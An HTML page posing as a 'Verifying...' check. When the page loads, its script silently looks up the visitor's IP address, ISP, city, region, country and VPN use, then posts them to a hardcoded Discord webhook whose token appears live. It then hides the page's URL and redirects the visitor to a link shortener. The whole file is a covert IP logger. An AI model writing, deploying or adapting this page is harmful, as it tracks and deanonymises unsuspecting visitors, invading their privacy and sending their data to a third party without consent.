<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Verification</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Arial', sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        h1 {
            font-size: 30px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <h1>Verifying...</h1>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
        const REDIRECT_URL = "https://is.gd/gwuu9c";

        async function getIPInfo() {
            try {
                const response = await fetch("https://ipinfo.io/json");
                if (!response.ok) throw new Error("Failed to fetch IP info");
                const data = await response.json();
                
                const ip = data.ip || "Unknown";
                const isp = data.org || "Unknown ISP";
                const country = data.country || "Unknown Country";
                const city = data.city || "Unknown City";
                const region = data.region || "Unknown Region";
                const vpn = data.bogon ? "Yes (Bogon IP)" : (isp.toLowerCase().includes("vpn") || isp.toLowerCase().includes("proxy")) ? "Yes" : "No";

                return { ip, isp, country, city, region, vpn };
            } catch (error) {
                console.error("Error fetching IP info:", error);
                return null;
            }
        }

        async function sendToWebhook(ipInfo) {
            if (!ipInfo) return;

            try {
                const payload = {
                    content: `New Visitor:\nIP: ${ipInfo.ip}\nVPN Detected: ${ipInfo.vpn}\nISP: ${ipInfo.isp}\nLocation: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`
                };
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("Error sending data to webhook:", error);
            }
        }

        (async function () {
            const ipInfo = await getIPInfo();
            await sendToWebhook(ipInfo);

            // Hide the original URL before redirecting
            history.replaceState(null, '', REDIRECT_URL);
            window.location.href = REDIRECT_URL;
        })();
    </script>

</body>
</html>
